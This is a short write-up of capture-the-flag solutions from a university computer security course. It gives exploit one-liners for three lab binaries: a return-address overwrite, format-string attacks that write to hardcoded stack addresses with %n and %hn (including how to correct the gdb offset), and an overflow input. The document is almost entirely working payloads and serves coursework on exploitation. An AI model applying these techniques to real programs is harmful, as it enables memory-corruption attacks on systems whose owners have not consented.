# PWN
### Flags captured in Computer Security Course held by Prof. Barenghi @ PoliMi

## First exploit - Mission 0: Ooh Easy

#### solution 1 (Exerciser Syle)
```bash
./mission0 < <(python -c "import sys;sys.stdout.write('\x3d\x07\x01\x01' + 'A'*8 + '\xab\x85\x04\x08')")
```
#### solution 2 (Personal Style)
```bash
./mission0 < <(python -c "print('\x3d\x07\x01\x01' + 'A'*8 + '\xab\x85\x04\x08')" )
```
<br><br>

## Second exploit - Mission 1: Aye Captain!

#### Step 1 - gdb n00b sol 
```bash
set args < <(python -c 'print"\x70\xd0\xff\xff" + "%134513911c" + "%4$n"')
```
#### Step 2 - gdb pro sol
```bash
set args < <(python -c 'print"\x72\xd0\xff\xff\x70\xd0\xff\xff%2044c%4$hn%31991c%5$hn"')
```

#### Step 3 - gdb pro sol [on necst machine]
```bash
set args < <(python -c 'print"\xa2\xc5\xff\xff\xa0\xc5\xff\xff%2044c%4$hn%31991c%5$hn"')
```

#### Step 4 - Road to clean sol [on necst machine]
let's find the offset on the stack due to gdb, just run the executable with this input on the shell with and without gdb. the offset will be [ADDR GDB] - [ADDR]
```bash
%22$x
```
#### Step 5 - clean sol [on necst machine]
```bash
./mission1 < <(python -c 'print"\xd2\xc5\xff\xff\xd0\xc5\xff\xff%2044c%4$hn%31991c%5$hn"') 
```

#### Step 6 - save the exploit on a file
```bash
(python -c 'print"\xd2\xc5\xff\xff\xd0\xc5\xff\xff%2044c%4$hn%31991c%5$hn"') > exploit
```

#### Step 7 - drop tha bomb, just create a file with the python script called exploit, and send to our executable ( - is for keep STDIN open)
```bash
cat exploit - | ./mission1
```
<br><br>

## Third exploit - Mission 2: Birdwatching
```bash
./mission2 < <(python -c "import sys; sys.stdout.write('AAAA' + '\x00' + '\x90'*140 + 'AAAA' + '\x00')")
```

<br><br>
